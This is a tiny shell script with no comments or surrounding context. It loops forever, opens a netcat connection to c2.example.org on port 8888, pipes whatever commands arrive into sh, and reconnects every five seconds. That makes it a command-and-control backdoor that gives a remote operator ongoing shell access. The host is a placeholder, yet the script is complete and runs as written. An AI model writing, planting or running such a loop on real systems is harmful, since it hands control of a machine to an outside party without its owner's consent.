#!/bin/sh
while true; do
 netcat c2.example.org 8888 | sh
 sleep 5
done
